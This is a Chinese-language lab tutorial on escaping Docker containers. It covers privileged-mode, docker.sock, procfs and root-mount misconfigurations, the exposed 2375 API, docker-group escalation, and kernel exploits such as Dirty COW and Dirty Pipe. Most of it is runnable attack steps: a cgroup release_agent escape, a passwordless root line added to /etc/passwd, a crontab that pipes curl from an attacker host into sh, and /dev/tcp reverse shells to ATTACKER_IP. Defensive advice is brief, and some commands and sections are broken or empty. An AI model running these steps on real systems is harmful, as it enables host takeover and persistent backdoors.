## 🎯 模块 1 · Docker 基础与安全模型回顾
### 1.1 Docker 是什么
一句话：**Docker = 进程隔离 + 文件系统分层 + 资源限制**，它不虚拟硬件，所有容器共享宿主机内核（这是逃逸的物理基础）。

```plain
┌─────────────────────────────────────────┐
│              宿主机 (Host)               │
│  ┌─────────┐ ┌─────────┐ ┌─────────┐    │
│  │ 容器 A   │ │ 容器 B   │ │ 容器 C   │    │
│  │  Nginx  │ │  MySQL  │ │  Redis  │    │
│  └────┬────┘ └────┬────┘ └────┬────┘    │
│       │           │           │          │
│       └───────────┴───────────┘          │
│                   │                      │
│         ┌─────────▼─────────┐            │
│         │   Linux Kernel    │  ← 共享！  │
│         └───────────────────┘            │
└─────────────────────────────────────────┘
```

**与虚拟机对比：**
```plain
虚拟机：          每个 VM 都有自己完整的内核（重，但隔离强）
Docker：         所有容器共享一个内核（轻，但隔离弱）
                    ↑ 这就是逃逸的根本原因
```

### 1.2 Docker 架构图（必背）
```plain
┌───────────┐   REST API    ┌──────────────────┐
│  docker   │ ────────────► │   dockerd        │ ← 守护进程，root 权限
│  (client) │ ◄──────────── │  (Docker Daemon) │
└───────────┘               └────────┬─────────┘
                                     │
                            ┌────────▼─────────┐
                            │  containerd/runc │ ← 真正创建容器
                            └────────┬─────────┘
                                     │
                            ┌────────▼─────────┐
                            │   container      │
                            └──────────────────┘
```

**关键点（必考）：**

+ `dockerd` 以 **root** 运行 → 谁能调用 dockerd，谁就约等于 root
+ 客户端通过 `/var/run/docker.sock`（Unix Socket）调用 dockerd
+ 也可以通过 TCP 2375 / 2376 端口远程调用 dockerd

### 1.3 容器的"六重盾牌"
Docker 用 6 种机制限制容器内的进程，**逃逸 = 打破其中一种或多种**：

| # | 机制 | 作用 | 类比 |
| --- | --- | --- | --- |
| 1 | **Namespace** | 隔离视图（PID、网络、挂载点…） | 给进程戴眼罩 |
| 2 | **Cgroup** | 限制资源（CPU、内存） | 给进程戴项圈 |
| 3 | **Capability** | 切分 root 权限成几十种小权限 | 把万能钥匙剪成小片 |
| 4 | **Seccomp** | 过滤系统调用 | 给进程戴口球 |
| 5 | **AppArmor/SELinux** | 强制访问控制 | 给进程穿防弹衣 |
| 6 | **只读文件系统/镜像** | overlayfs 上层只读 | 给文件上锁 |


记住一句话：**逃逸不是"魔法"，逃逸 = 找到某一面盾牌被故意打开/被绕过的地方**。

## 🧭 模块 2 · 逃逸的本质：三种路径
T Wiki 把容器逃逸方法分成三大类（[容器逃逸方法检测指北](https://wiki.teamssix.com/cloudnative/docker/container-escape-check.html)）：

```plain
┌─────────────────────────────────────────────────┐
│            容器逃逸三条路                         │
├─────────────────────────────────────────────────┤
│                                                 │
│  路径 A: 不安全配置（最常见，约 80%）               │
│    ├─ 特权模式 --privileged                      │
│    ├─ 危险挂载（docker.sock / procfs / /）        │
│    ├─ 过大 Capability（CAP_SYS_ADMIN…）          │
│    └─ Docker 组成员 / 远程 API 未授权             │
│                                                 │
│  路径 B: 内核漏洞（威力大，依赖内核版本）            │
│    ├─ Dirty COW (CVE-2016-5195)                 │
│    ├─ Netfilter (CVE-2021-22555)                │
│    ├─ OverlayFS (CVE-2021-3493)                 │
│    └─ Dirty Pipe (CVE-2022-0847)                │
│                                                 │
│  路径 C: 程序漏洞（runc、Docker 自身）             │
│    ├─ CVE-2019-16884 (AppArmor 绕过)            │
│    └─ CVE-2022-23222 (eBPF 提权)                │
│                                                 │
└─────────────────────────────────────────────────┘
```

**重要思维模型：** 拿到容器内的 shell 后，第一步不是乱试，而是**信息收集 → 判断属于哪一类 → 选对应手法**。

## 🔍 模块 3 · 信息收集：判断能否逃逸
### 3.1 第一步：确认自己在容器里
```bash
# 方法 1：检查 /.dockerenv
ls -la /.dockerenv    # 存在就是在容器内

# 方法 2：检查 /proc/1/cgroup
cat /proc/1/cgroup | grep docker

# 方法 3：检查 fstab
cat /proc/1/mountinfo | grep -E 'docker|overlay'
```

### 3.2 第二步：判断是否特权模式
```bash
# 特权容器的标志：cap_eff 中包含所有 cap（满位）
cat /proc/1/status | grep CapEff
# 输出示例：CapEff: 0000003fffffffff   ← 全 1 = 特权容器！
# 输出示例：CapEff: 00000000a80425fb   ← 普通 cap = 非特权
```

**在线工具：** 把 CapEff 的十六进制丢到 [https://mxkrsv.net/capcalc/](https://mxkrsv.net/capcalc/) 反解，能看到具体有哪些 capability。

### 3.3 第三步：检查挂载
```bash
# 列出所有挂载点，找危险挂载
cat /proc/1/mountinfo | grep -E 'docker.sock|/proc|/sys|/ :|/host'
mount | grep -E 'docker.sock|/proc|/sys|cgroup'
```

**危险信号：**
+ `/var/run/docker.sock` 被挂载 → 路径 A
+ `/proc` 被挂载到非 `/proc` 路径 → 路径 A
+ 宿主机根 `/` 被挂载 → 直接读写宿主机
+ `/sys/fs/cgroup` 可写 → CVE-2022-0492

### 3.4 第四步：检查内核版本（决定路径 B 的可行性）
```bash
uname -r
# 5.8 ~ 5.16.10 → Dirty Pipe 可能
# < 5.7 → Dirty COW 可能
# 等等
```

### 3.5 自动化检测：container-escape-check
```bash
# 在容器内执行
wget https://raw.githubusercontent.com/teamssix/container-escape-check/main/container-escape-check.sh
chmod +x container-escape-check.sh
./container-escape-check.sh
```

输出会列出所有可逃逸条件（特权、危险挂载、内核漏洞…），是后续实验的指北针。

## ⚙️ 模块 4 · 不安全配置类逃逸（重头戏）
### 4.1 特权模式逃逸（Privileged Container Escape）
#### 4.1.1 什么是特权模式
```bash
docker run -it --privileged ubuntu /bin/bash
```

`--privileged` 会：
+ 关掉所有 capability 限制（给全权）
+ 关掉 Seccomp
+ 关掉 AppArmor
+ **把宿主机所有设备 `/dev/*` 全部挂载进容器**
等于让容器内的 root 拥有了和宿主机 root 几乎一样的权力。

#### 4.1.2 原理图
```plain
普通容器：           特权容器：
┌──────────┐         ┌──────────┐
│  root    │         │  root    │
│ cap受限  │         │ 全cap    │
│ /dev空   │         │ /dev齐全 │← sda、mem、kvm 全在
│ Seccomp  │         │ 无过滤   │
└──────────┘         └──────────┘
                       ↓ 直接读写宿主机磁盘
                     /dev/sda1 → 宿主机文件系统
```

#### 4.1.3 复现步骤
**Step 1 · 启动特权靶场**
```bash
docker run -it --privileged=true ubuntu:20.04 /bin/bash
```

**Step 2 · 容器内识别**
```bash
capsh --print        # 看到一堆 cap = 特权
fdisk -l             # 看到宿主机磁盘 /dev/sda* /dev/vda*
```

**Step 3 · 挂载宿主机磁盘**
```bash
# 方法 A：直接挂载磁盘分区
mkdir /host
mount /dev/sda1 /host          # 把宿主机根分区挂进来
ls /host                       # 看到 /etc /root /home 等宿主机目录

# 方法 B（更通用）：用 cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'touch /host_root_pwned >> /cmd' 
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"   # 触发 release_agent
```

宿主机根目录出现 `/host_root_pwned` 文件 = 逃逸成功。

#### 4.1.4 防御
+ 永远不要在生产环境用 `--privileged`
+ 必要时用 `--cap-add=具体cap` 精细授权
+ 启用 user namespace 重映射（`userns-remap`）

### 4.2 挂载 docker.sock 逃逸
#### 4.2.1 什么是 docker.sock
`/var/run/docker.sock` 是 dockerd 监听的 Unix Socket，docker 客户端就是通过它和守护进程通信的。**谁有这个文件，谁就能调度 dockerd**。

很多 CI/CD 工具（Jenkins agent、GitLab Runner）为了在容器里跑 docker 命令，会把它挂进容器：
```bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
```

#### 4.2.2 原理
```plain
攻击者拿到容器 shell
       │
       │ docker -H unix:///var/run/docker.sock run -v /:/host alpine
       ▼
容器内 → docker.sock → dockerd (root)
                            │
                            │ 创建新容器，挂载宿主机根目录
                            ▼
                     新容器里能读写宿主机文件 = 逃逸
```

#### 4.2.3 复现步骤
**Step 1 · 搭靶场**
```bash
docker run -itd --name with-sock -v /var/run/docker.sock:/var/run/docker.sock docker:latest
docker exec -it with-sock sh
```

**Step 2 · 容器内操作**
```bash
# 查看宿主机上的容器列表（说明已控制 dockerd）
docker ps -a

# 启动一个挂载宿主机根目录的新容器
docker run -it -v /:/host alpine /bin/sh

# 在新容器中
ls /host              # 宿主机文件！
echo "pwned::0:0::/:/bin/sh" >> /host/etc/passwd   # 加个 root 用户
```

退出后用 `su pwned` 登录宿主机，无密码拿到 root。

#### 4.2.4 不装 docker 客户端的替代方案（curl）
```bash
curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s -X POST -H "Content-Type: application/json" \
  --unix-socket /var/run/docker.sock \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

#### 4.2.5 防御
+ 不要把 `docker.sock` 挂进容器
+ 必须挂载时，启用 TLS + 用户认证
+ 使用 rootless Docker 或 Podman

### 4.3 挂载宿主机 procfs 逃逸
#### 4.3.1 什么是 procfs
`/proc` 是 Linux 内核暴露运行状态的伪文件系统，里面有大量敏感文件：

| 文件 | 作用 | 危险点 |
| --- | --- | --- |
| `/proc/sys/kernel/core_pattern` | 程序崩溃时执行的命令 | 写入 → 任意命令执行 |
| `/proc/sysrq-trigger` | 内核魔术键触发 | 直接重启/崩溃 |
| `/proc/<pid>/...` | 任意进程信息 | 内存映射、fd |


把宿主机的 `/proc` 挂进容器 = 把内核"控制面板"送给攻击者。

#### 4.3.2 原理：core_pattern 后门
```plain
1. 容器内写 /host-proc/sys/kernel/core_pattern：
   "|/tmp/payload"
   ↓
2. 在容器内放置 /tmp/payload 脚本（路径会被内核解析为宿主机路径）
   ↓
3. 任何进程崩溃 → 内核以 root 执行 /tmp/payload
   ↓
4. payload 在宿主机上跑 = 逃逸
```

#### 4.3.3 复现
**Step 1 · 搭靶场**
```bash
docker run -it --rm -v /proc:/host_proc ubuntu /bin/bash
```

**Step 2 · 用 cdk 一键利用**
```bash
# 容器内
cdk run mount-procfs /host_proc 'echo "echo pwned > /tmp/pwned" > /tmp/payload; chmod +x /tmp/payload'
```

**Step 3 · 手动利用（理解原理）**
```bash
# 写 core_pattern，| 开头表示通过管道交给后面的程序
echo "|/tmp/payload" > /host_proc/sys/kernel/core_pattern

# 写 payload（注意：会被内核当作宿主机路径解析）
cat > /tmp/payload << 'EOF'
#!/bin/sh
id > /tmp/pwned
EOF
chmod +x /tmp/payload

# 触发崩溃（让内核执行 core_pattern）
sleep 1000 &
kill -SEGV %1              # 给进程发段错误信号

# 在宿主机上检查 /tmp/pwned 文件
```

#### 4.3.4 防御
+ 禁止挂载宿主机 `/proc`（除非容器是宿主机本地诊断工具）
+ 启用 seccomp 禁止 `prctl(PR_SET_COREDUMP)` 等

### 4.4 挂载宿主机根目录逃逸（最直白）
**搭建靶场：**
```bash
docker run -it --name root-mount -v /:/host ubuntu /bin/bash
```

**进入容器：**
```bash
docker exec -it root-mount /bin/bash
```

没什么原理好讲——直接把宿主机根目录挂进容器，什么都能改：

```bash
# 写 ssh 公钥
echo "ssh-rsa AAAA... > /host/root/.ssh/authorized_keys

# 写 cron 反弹
echo "* * * * * root curl http://attacker/sh | sh" >> /host/etc/crontab

# 改 root 密码
chroot /host passwd root
```

### 4.5 Docker 远程 API 未授权访问逃逸
#### 4.5.1 漏洞成因
Docker 守护进程可以开启 TCP 监听：
```bash
# 危险配置（用户为了远程管理常常这样开）
dockerd -H tcp://0.0.0.0:2375
```

**2375 端口默认无认证、无加密**。任何能访问到这个端口的人都能完全控制 dockerd。

#### 4.5.2 探测
```bash
# 简单访问：返回 404 就是存在（API 不响应根路径，但服务在线）
curl http://target:2375/

# 列容器
curl http://target:2375/containers/json
```

#### 4.5.3 复现
**Step 1 · 搭靶场（在虚拟机里）**
```bash
sudo mkdir -p /etc/systemd/system/docker.service.d
cat << 'EOF' | sudo tee /etc/systemd/system/docker.service.d/override.conf
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock
EOF
sudo systemctl daemon-reload && sudo systemctl restart docker
```

**Step 2 · 攻击机操作**
```bash
# 远程列容器
docker -H tcp://target:2375 ps -a

# 远程启动逃逸容器
docker -H tcp://target:2375 run -it -v /:/host alpine /bin/sh
```

进入 `/host` 即拿到宿主机根目录读写权。

**Step 3 · 一句话反弹 shell（写入宿主机 crontab）**
```bash
echo "* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1" >> /host/etc/crontab
```

#### 4.5.4 防御
+ 永远不要把 2375 暴露到公网
+ 必须远程访问时启用 TLS（2376 端口 + 证书）
+ 用防火墙限制来源 IP

### 4.6 Docker 用户组提权
#### 4.6.1 原理
安装 Docker 时默认会创建一个 `docker` 组。**任何属于 docker 组的用户都能不输 sudo 调用 docker 命令**，等同 root（因为可以随便挂载 `/etc`、`/`）。

很多运维图方便，把开发账号加进 docker 组——等于把 root 密码贴墙上。

#### 4.6.2 搭建靶场
模拟"运维图方便把开发账号加进 docker 组"的真实场景：
```bash
# 1. 在宿主机上创建普通用户 dev
sudo useradd -m -s /bin/bash dev
echo "dev:dev123" | sudo chpasswd

# 2. 把 dev 加入 docker 组（这是危险动作，也是漏洞根源）
sudo usermod -aG docker dev

# 3. 验证
su - dev
id        # 应该看到 groups=...,...,docker
docker ps # 不加 sudo 也能跑 = 危险
```

如果想模拟"通过 Web 漏洞拿到 dev 的 shell"，可以再装个 SSH：
```bash
sudo apt-get install -y ssh
sudo systemctl enable --now ssh
# 然后用 ssh dev@虚拟机IP，密码 dev123 登录
```

#### 4.6.3 复现
**场景：** 你拿到了一个普通用户 `dev` 的 shell，`id` 显示在 `docker` 组里。
```bash
id
# uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)

# 直接挂载宿主机 /etc
docker run -it -v /etc:/host_etc ubuntu /bin/bash

# 容器内修改 sudoers，让 dev 免密 sudo
echo "dev ALL=(ALL) NOPASSWD:ALL" >> /host_etc/sudoers

# 退回宿主机
exit
sudo su       # 直接是 root
```

#### 4.6.3 防御
+ 不要把人加入 docker 组
+ 用 rootless Docker 或 sudo + 白名单
+ 用 Podman 替代

## 💣 模块 5 · 内核漏洞类逃逸
⚠️ 内核漏洞逃逸**前提是宿主机内核未打补丁**。现代系统大概率已修复，复现要找老内核。

### 5.1 CVE-2016-5195 · Dirty COW（脏牛）
#### 5.1.1 漏洞信息
| 项目 | 内容 |
| --- | --- |
| 类型 | 内核 COW（写时复制）竞争条件 |
| 影响版本 | Linux 2.6.22 ~ 4.8.3（2006-2016） |
| 危害 | 任意只读文件可写 → 提权 / 容器逃逸 |
| 利用难度 | 中（有公开 PoC） |


#### 5.1.2 原理（图解）
```plain
正常 COW：
  进程 mmap 一个只读文件 → 想写 → 内核复制一份副本 → 写副本
                                              ↑ 原文件不动

脏牛 BUG：
  进程 mmap 只读文件 → 疯狂触发写 + madvise(MADV_DONTNEED)
       │
       ├─ 线程 A：写入触发 COW
       └─ 线程 B：madvise 撤销映射
       ↓
   竞争窗口 → 内核漏掉权限检查 → 写到了原文件！
```

#### 5.1.3 容器逃逸思路：VDSO
VDSO（Virtual Dynamic Shared Object）是一段内核映射到每个进程的共享内存，里面是 `clock_gettime()` 等高频函数。**VDSO 在所有容器和宿主机之间共享**。
```plain
1. 容器内用 Dirty COW 改写 VDSO 中的 clock_gettime()
2. 注入 shellcode（反弹 shell）
3. 宿主机任何进程调用 clock_gettime() → 触发 shellcode
4. shellcode 在宿主机 root 上下文执行 = 逃逸
```

#### 5.1.4 复现
#### 5.1.4 搭建靶场
Dirty COW 依赖**宿主机内核 ≤ 4.8.3**，容器镜像无关紧要。推荐两种方案：
```bash

# 下载：http://old-releases.ubuntu.com/releases/14.04.5/
# 自带内核 3.13，原生支持
uname -r                # 应显示 3.13.0-xx-generic

# 方案 B：用 sourcexu7/docker-vuls 靶场集合（含脏牛环境）
git clone https://github.com/sourcexu7/docker-vuls
cd docker-vuls/dirtycow
docker-compose up -d

# 装依赖（宿主机上）
sudo apt-get install -y docker.io
```

**进入靶场容器：**
```bash

# 容器内
apt-get update && apt-get install -y gcc git
```

#### 5.1.5 复现命令

### 5.2 CVE-2021-22555 · Netfilter 堆溢出
#### 5.2.1 漏洞信息
| 项目 | 内容 |
| --- | --- |
| 类型 | Netfilter 模块堆溢出（IPT_SO_SET_REPLACE） |
| 影响版本 | Linux 2.6.19 ~ 5.12-rc8（存在 15 年） |
| 危害 | 本地提权 + 容器逃逸 |
| 利用难度 | 高（需要堆喷射 + UAF） |


#### 5.2.2 原理
Netfilter（iptables 的内核部分）在处理 32 位兼容模式的 `setsockopt(IPT_SO_SET_REPLACE)` 时，`memcpy` 后多写了两个 `\0` 字节，导致堆溢出。
```plain
用户态：setsockopt(fd, SOL_IP, IPT_SO_SET_REPLACE, struct ipt_replace)
       ↓
内核态：translate_table() → memcpy 拷贝规则
                                  ↓
                          末尾 memset 写了 2 字节 \0
                                  ↓
                          越界写到相邻堆对象
```

利用链：**堆喷 **`msg_msg`** → UAF → 修改 **`cred`** 结构 → root**。

#### 5.2.3 容器逃逸
容器和宿主机共享同一个内核 → 内核漏洞直接打通宿主机。利用 PoC 拿到容器内"真 root"（绕过 namespace）后，通过 `nsenter` 切到宿主机命名空间。

参考：[kernel-exploit-factory](https://github.com/bsauce/kernel-exploit-factory)、[绿盟 2021 攻击技术报告](https://blog.nsfocus.net/wp-content/uploads/2022/08/NSFOCUS.pdf)

#### 5.2.4 搭建靶场
需要一个内核 ≤ 5.11 的环境（5.12 已修复）。最快的方式是用老内核 Ubuntu 镜像起虚拟机：
```bash
# 方案 A：在 VMware/VirtualBox 中新建虚拟机，安装 Ubuntu 20.04
#         自带内核 5.4，满足漏洞条件，无需额外操作
# 方案 B：用 docker-vuls 项目直接拉靶场镜像
docker pull ukoloff/ubuntu-14.04
# 注意：内核漏洞必须在宿主机内核未修复才有效，容器本身修复不能复现
#       因此正确的做法是在老内核虚拟机里跑 Docker
```

具体步骤：
```bash
# 1. 在 Ubuntu 20.04（内核 5.4）虚拟机里
uname -r                  # 确认内核 5.4.0-x
sudo apt-get install -y docker.io gcc-multilib

# 2. 起一个普通容器（不需要特权）
docker run -it --rm ubuntu:20.04 /bin/bash

# 3. 容器内准备编译环境
apt-get update && apt-get install -y gcc git
```

#### 5.2.5 复现命令（高度依赖环境，仅作示意）
```bash

cd security-research/pocs/linux/cve-2021-22555

# 拿到 root 后

```

### 5.3 CVE-2021-3493 · OverlayFS 提权
#### 5.3.1 漏洞信息
| 项目 | 内容 |
| --- | --- |
| 类型 | OverlayFS capability 校验绕过 |
| 影响版本 | Ubuntu 定制内核（4.x ~ 5.8 前） |
| 危害 | 本地提权 + 容器逃逸 |
| 利用难度 | 低（PoC 简单） |


#### 5.3.2 原理
OverlayFS 是 Docker 镜像分层的底层文件系统。Ubuntu 给 OverlayFS 打了个补丁允许在 user namespace 内挂载，但**没有校验 user namespace 内 capabilities 是否能"穿透"到宿主机**。
```plain
1. 攻击者在 user namespace 内挂载 OverlayFS
2. 在 Overlay 上给某文件设置 cap（如 setcap cap_setuid+ep ./malware）
3. BUG：这个 cap 被记录到宿主机真实文件上
4. 退出 user namespace，在宿主机直接执行 ./malware → 拿到 cap_setuid → root
```

#### 5.3.3 搭建靶场
CVE-2021-3493 是 **Ubuntu 定制内核特有**漏洞，必须用 Ubuntu 老内核：
```bash
# 1. 准备 Ubuntu 20.04 / 18.04 虚拟机（内核 < 5.8 即可）
#    注意：必须用 Ubuntu 官方内核，不能用 mainline 通用内核
#    因为漏洞在 Ubuntu 给 OverlayFS 打的补丁里
uname -r                # 应该看到 5.4.0-xx-generic 这种 Ubuntu 后缀

# 2. 确认 user_namespace 没禁用
cat /proc/sys/kernel/unprivileged_userns_clone
# 0 则需要开启：echo 1 | sudo tee /proc/sys/kernel/unprivileged_userns_clone

# 3. 起一个普通容器（无需特权）
docker run -it --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:20.04 /bin/bash
# 注：需要 SYS_ADMIN 和关 AppArmor 是为了能挂载 OverlayFS
```

#### 5.3.4 复现
```bash
# 容器内
apt-get update && apt-get install -y gcc git
git clone https://github.com/briskets/CVE-2021-3493
cd CVE-2021-3493
gcc exploit.c -o exploit
./exploit
```

参考：[腾讯云：OverlayFS 提权漏洞 CVE-2021-3493 复现](https://cloud.tencent.com/developer/article/2625323)

### 5.4 CVE-2022-0847 · Dirty Pipe（脏管道）
#### 5.4.1 漏洞信息
| 项目 | 内容 |
| --- | --- |
| 类型 | pipe 结构体 `flags` 未初始化 → 任意文件页面缓存覆写 |
| 影响版本 | Linux 5.8 ~ 5.16.10 / 5.15.24 / 5.10.101 |
| 危害 | 任意只读文件可写 |
| 利用难度 | 极低（PoC 不到 100 行 C） |


#### 5.4.2 原理
```plain
struct pipe_buffer {
    struct page *page;     // 指向页面
    ...
    unsigned int flags;    // ← 没有初始化！
};

splice() 把文件内容塞进管道时，flags 复用了上一任 pipe_buffer 的 PIPE_BUF_FLAG_CAN_MERGE
       ↓
之后 write(pipe) 会"合并写入"到这个页面
       ↓
但页面其实是页缓存（page cache）！
       ↓
写入的数据 = 直接修改了文件在内核缓存的页面 = 修改了文件本身
       ↓
任意只读文件被覆写
```

#### 5.4.3 容器逃逸思路
```plain
容器内 /etc/passwd 是 overlayfs 的底层只读层（来自镜像）
       ↓
Dirty Pipe 覆写 /etc/passwd，加一个 root 用户
       ↓
但 overlayfs 的底层文件就是宿主机 /var/lib/docker/overlay2/.../etc/passwd
       ↓
宿主机上 docker 镜像文件被永久篡改
       ↓
（更狠的做法）覆写 runc 二进制本身，下次任何容器启动都执行 shellcode
```

#### 5.4.4 搭建靶场
需要内核 **5.8 ≤ kernel < 5.16.11** 的环境：
```bash
# 方案 A：Ubuntu 21.10（impish）自带内核 5.13，完美命中
# 下载地址：https://old-releases.ubuntu.com/releases/21.10/
# 安装到 VMware/VirtualBox 后：
uname -r                # 应显示 5.13.0-xx-generic

# 方案 B：在 Ubuntu 20.04 上手动装 HWE 内核 5.13
sudo apt-get install -y --install-recommends linux-generic-hwe-20.04
# 重启后 uname -r 应为 5.13 或更新（但不要超过 5.16.10）

# 方案 C：Docker 镜像（仅用作 PoC 测试容器）
docker run -it --rm ubuntu:21.10 /bin/bash
# 注意：容器内能否成功取决于宿主机内核，不是镜像！

# 启用 SSH 模拟远程入侵
sudo apt-get install -y docker.io openssh-server
sudo systemctl enable --now ssh docker
```

#### 5.4.5 复现
```bash
git clone https://github.com/JlSakuya/CVE-2022-0847-container-escape
cd CVE-2022-0847-container-escape
gcc exploit.c -o exploit -lpthread
./exploit
```

参考：[Datadog Security Labs - Dirty Pipe Container Escape PoC](https://securitylabs.datadoghq.com/articles/dirty-pipe-container-escape-poc/)

#### 5.4.5 防御
+ 升级内核到 5.16.11 / 5.15.25 / 5.10.102 及以上
+ Docker Engine ≥ 20.10.13 已加入缓解

### 6.1 CVE-2019-16884 · AppArmor 绕过
#### 原理
Docker 默认在 Ubuntu 上启用 AppArmor 限制容器。但 runc 在某些路径校验上存在 TOCTOU（time-of-check to time-of-use）漏洞，可以通过符号链接让 AppArmor 看到一个路径、实际访问另一个路径，从而绕过策略。

#### 搭建靶场（仅作了解）
```bash
# 需要 Ubuntu + 启用 AppArmor 的 Docker
sudo apt-get install -y apparmor apparmor-utils
docker run -it --rm --security-opt apparmor=docker-default ubuntu:18.04 /bin/bash
# 容器内尝试构造符号链接竞争，详见 T Wiki 原文
```

利用条件苛刻，多用于 CTF。参考：[T Wiki CVE-2019-16884](https://wiki.teamssix.com/cloudnative/docker/cve-2019-16884.html)

### 6.2 CVE-2022-23222 · eBPF 提权
#### 原理
eBPF（extended Berkeley Packet Filter）允许用户态程序注入内核运行的小代码片段。`verifier`（验证器）本应拒绝危险代码，但存在边界错误，攻击者可构造指针越界的 BPF 程序，读写内核内存 → 提权。

由于 BPF 在宿主机内核执行，可绕过容器命名空间实现逃逸。

#### 搭建靶场（仅作了解）
```bash
# 需要内核 5.8 ~ 5.16 rc1（修复前）
# 在 Ubuntu 21.10 虚拟机中：
docker run -it --rm --privileged ubuntu:21.10 /bin/bash
# 注：需要 privileged 才能使用 BPF；真实漏洞场景不依赖 privileged，
# 但 PoC 编译需要 bpf 工具链，复现成本较高，建议看 PoC 视频理解
```

参考：[T Wiki CVE-2022-23222](https://wiki.teamssix.com/cloudnative/docker/cve-2022-23222.html)

## 🎓 模块 7 · 综合靶场：一次完整逃逸流程
### 7.1 题目设定
 你拿到了一个 Web 应用 Shell（漏洞点省略，假设已 RCE）。`id` 显示你是 www-data，需要拿到宿主机 root。

### 7.2 标准流程
```plain
Step 1 · 信息收集
─────────────────
ls -la /.dockerenv            # 确认在容器内
cat /proc/1/cgroup | head -1  # 看到docker字样
cat /proc/1/status | grep CapEff
                              # 假设 CapEff = 0000003fffffffff → 特权！

Step 2 · 选路径：特权模式 → cgroup release_agent
─────────────────
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

Step 3 · 写 payload
─────────────────
cat > /cmd << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /cmd

Step 4 · 触发
─────────────────
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 攻击机：nc -lvnp 4444 → 收到宿主机 root shell
```

### 7.3 验证逃逸成功
```bash
# 攻击机上拿到的 shell
hostname          # 不是容器 ID 而是宿主机名
ls /var/lib/docker/overlay2   # 能看到 docker 内部目录
```
